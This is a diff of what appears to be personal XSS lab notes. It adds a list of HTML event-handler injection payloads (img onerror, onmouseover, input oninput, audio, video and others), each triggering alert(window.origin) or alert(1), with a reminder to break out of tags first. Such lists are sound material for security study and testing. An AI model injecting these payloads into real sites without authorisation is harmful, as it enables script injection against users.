@@ -62,5 +62,24 @@ onerror=alert(1) <- adding an element with false link and generating alert in er
 4. 
 
 ------------------------------------------------------------------------------------
-[+] My Own Event Handler Labs's Solutions
-<input onselect=="alert(window.origin)" value="select me">
+[+] My Own Event Handler Labs's Solutions ( context: html tags, remember to inject these payloads we first need to break the tags )
+
+<img src=x onerror="alert(window.origin)">
+<img src=x onload="alert(window.origin)">
+<img src=x onclick="alert(window.origin)">
+<img src=x onmouseover="alert(window.origin)">
+<img src=x onfocus="alert(window.origin)" tabIndex="0">
+<img src=x onblur="alert(window.origin)"> 
+<input oninput="alert(window.origin)">
+<div ondblclick="alert(1)">Double-click me</div>
+<input onkeypress="alert(window.origin)" value="select me">
+<input onselect="alert(window.origin)" value="select me">
+<button onmouseup="alert(window.origin)">Release me</button>
+<button onmousedown="alert(1)">Release me</button>
+<input onpaste="alert(1)" value="paste here">   // when something is pasted
+<input oncut="alert(1)" value="cut me">  // when content is cut
+<input oncopy="alert(1)" value="copy me">
+<audio controls onvolumechange=="alert(window.origin)" src="https://sudohopex.github.io/img/ankhon-me-desh-bashaye.mp3"></audio>          # more events: onplay, onpause, onended
+<video width="200" controls ontimeupdate="alert(window.origin)">               # more events: onplay, onended, onpause, ontimeupdate, ondurationchange
+  <source src="http://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4" type="video/mp4">
+</video>
